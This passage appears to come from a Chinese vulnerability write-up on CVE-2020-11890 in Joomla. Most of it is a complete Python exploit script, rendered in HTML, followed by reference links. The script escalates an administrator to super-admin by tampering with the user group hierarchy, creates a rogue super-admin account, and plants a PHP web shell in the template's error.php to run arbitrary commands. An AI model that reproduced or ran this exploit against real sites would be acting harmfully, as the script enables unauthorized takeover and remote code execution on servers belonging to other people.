try_admin_login(sess, url, uname, upass):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;admin_url = url + &#39;/administrator/index.php&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print(&#39;[+] Getting token for admin login&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;resp = sess.get(admin_url, verify=True)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;token = extract_token(resp)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if not token:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return False</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print(&#39;[+] Logging in to admin&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;data = {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;username&#39;: uname,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;passwd&#39;: upass,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;task&#39;: &#39;login&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;token: &#39;1&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;resp = sess.post(admin_url, data=data, verify=True)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if &#39;task=profile.edit&#39; not in resp.text:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&#39;[!] Admin Login Failure!&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return None</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print(&#39;[+] Admin Login Successfully!&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return True</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234">def checkAdmin(url, sess):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print(&quot;[+] Checking admin&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;url_check = url + &#39;/administrator/index.php?option=com_users&amp;view=users&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;resp = sess.get(url_check, verify=True)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;token = extract_token(resp)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if not token:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print &quot;[-] You are not administrator!&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sys.exit()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return token</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234">def checkSuperAdmin(url, sess):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print(&quot;[+] Checking Superadmin&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;url_check = url + &#39;/administrator/index.php?option=com_config&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;resp = sess.get(url_check, verify=True)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;token = extract_token(resp)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if not token:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print &quot;[-] You are not Super-Users!&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sys.exit()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return token</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234">def changeGroup(url, sess, token):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print(&quot;[+] Changing group&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;newdata = {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;jform[title]&#39;: &#39;Public&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;jform[parent_id]&#39;: 100,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;task&#39;: &#39;group.apply&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;token: 1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;newdata[&#39;task&#39;] = &#39;group.apply&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;resp = sess.post(url + &quot;/administrator/index.php?option=com_users&amp;layout=edit&amp;id=1&quot;, data=newdata,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;verify=True)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if &#39;jform[parent_id]&#39; not in resp.text:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&#39;[!] Maybe failed to change group...&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return False</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;else:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print &quot;[+] Done!&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return True</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234">def create_user(url, sess, username, password, email, token):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;newdata = {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Form data</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;jform[name]&#39;: username,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;jform[username]&#39;: username,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;jform[password]&#39;: password,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;jform[password2]&#39;: password,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;jform[email]&#39;: email,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;jform[resetCount]&#39;: 0,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;jform[sendEmail]&#39;: 0,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;jform[block]&#39;: 0,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;jform[requireReset]&#39;: 0,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;jform[id]&#39;: 0,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;jform[groups][]&#39;: 8,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;token: 1,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;newdata[&#39;task&#39;] = &#39;user.apply&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;url_post = url + &quot;/administrator/index.php?option=com_users&amp;layout=edit&amp;id=0&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;sess.post(url_post, data=newdata, verify=True)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;sess.get(url + &quot;/administrator/index.php?option=com_login&amp;task=logout&amp;&quot; + token + &quot;=1&quot;, verify=True)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;sess = requests.Session()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if try_admin_login(sess, url, username, password):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print &quot;[+] Now, you are super-admin!!!!!!!!!!!!!!!!&quot; + &quot;\n[+] Your super-admin account: \n[+] USERNAME: &quot; + username + &quot;\n[+] PASSWORD: &quot; + password + &quot;\n[+] Done!&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;else:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print &quot;[-] Sorry,exploit fail!&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return sess</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234">def changeGroupDefault(url, sess, token):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print(&quot;[+] Changing group&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;newdata = {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;jform[title]&#39;: &#39;Public&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;jform[parent_id]&#39;: 0,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;task&#39;: &#39;group.apply&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;token: 1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;newdata[&#39;task&#39;] = &#39;group.apply&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;resp = sess.post(url + &quot;/administrator/index.php?option=com_users&amp;layout=edit&amp;id=1&quot;, data=newdata,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;verify=True)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if &#39;jform[parent_id]&#39; not in resp.text:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&#39;[!] Maybe failed to change group...&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return False</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;else:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print &quot;[+] Done!&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return True</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234">def rce(sess, url, cmd, token):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;filename = &#39;error.php&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;shlink = url + &#39;/administrator/index.php?option=com_templates&amp;view=template&amp;id=506&amp;file=506&amp;file=L2Vycm9yLnBocA%3D%3D&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;shdata_up = {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;jform[source]&#39;: &quot;&lt;?php echo &#39;Hacked by HK\n&#39; ;system($_GET[&#39;cmd&#39;]); ?&gt;&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;task&#39;: &#39;template.apply&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;token: &#39;1&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;jform[extension_id]&#39;: &#39;506&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;jform[filename]&#39;: &#39;/&#39; + filename</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;sess.post(shlink, data=shdata_up)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;path2shell = &#39;/templates/protostar/error.php?cmd=&#39; + cmd</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;# print &#39;[+] Shell is ready to use: &#39; + str(path2shell)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print &#39;[+] Checking:&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;shreq = sess.get(url + path2shell)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;shresp = shreq.text</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print shresp + &#39;[+] Shell link: \n&#39; + (url + path2shell)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print &#39;[+] Module finished.&#39;</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234">def main():</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;# Construct the argument parser</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;ap = argparse.ArgumentParser()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;# Add the arguments to the parser</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;ap.add_argument(&quot;-url&quot;, &quot;--url&quot;, required=True,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;help=&quot; URL for your Joomla target&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;ap.add_argument(&quot;-u&quot;, &quot;--username&quot;, required=True,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;help=&quot;username&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;ap.add_argument(&quot;-p&quot;, &quot;--password&quot;, required=True,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;help=&quot;password&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;ap.add_argument(&quot;-usuper&quot;, &quot;--usernamesuper&quot;, default=&quot;hk&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;help=&quot;Super&#39;s username&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;ap.add_argument(&quot;-psuper&quot;, &quot;--passwordsuper&quot;, default=&quot;12345678&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;help=&quot;Super&#39;s password&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;ap.add_argument(&quot;-esuper&quot;, &quot;--emailsuper&quot;, default=&quot;hk@hk.com&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;help=&quot;Super&#39;s Email&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;ap.add_argument(&quot;-cmd&quot;, &quot;--command&quot;, default=&quot;whoami&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;help=&quot;command&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;args = vars(ap.parse_args())</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;# target</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;url = format(str(args[&#39;url&#39;]))</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print &#39;[+] Your target: &#39; + url</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;# username</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;uname = format(str(args[&#39;username&#39;]))</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;# password</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;upass = format(str(args[&#39;password&#39;]))</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;# command</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;command = format(str(args[&#39;command&#39;]))</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;# username of superadmin</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;usuper = format(str(args[&#39;usernamesuper&#39;]))</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;# password of superadmin</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;psuper = format(str(args[&#39;passwordsuper&#39;]))</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;# email of superadmin</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;esuper = format(str(args[&#39;emailsuper&#39;]))</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;# session</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;sess = requests.Session()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if not try_admin_login(sess, url, uname, upass): sys.exit()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;token = checkAdmin(url, sess)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if not changeGroup(url, sess, token):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print &quot;[-] Sorry,exploit fail!&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sys.exit()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;sess = create_user(url, sess, usuper, psuper, esuper, token)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;token = checkSuperAdmin(url, sess)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;# Now you are Super-admin</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if token:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# call RCE</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;changeGroupDefault(url, sess, token) &nbsp;# easy to view :))</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rce(sess, url, command, token)</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234">if __name__ == &quot;__main__&quot;:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;sys.exit(main())</span></p><h2 class="cs868C439D">
			<a name="参考链接"><span class="cs83F14626">参考链接</span></a></h2>
		<p class="cs6FD73CFB"><span class="cs8926E06">https://xz.aliyun.com/t/7709#toc-1<br/>https://github.com/HoangKien1020/CVE-2020-11890</span></p></body>
</html>
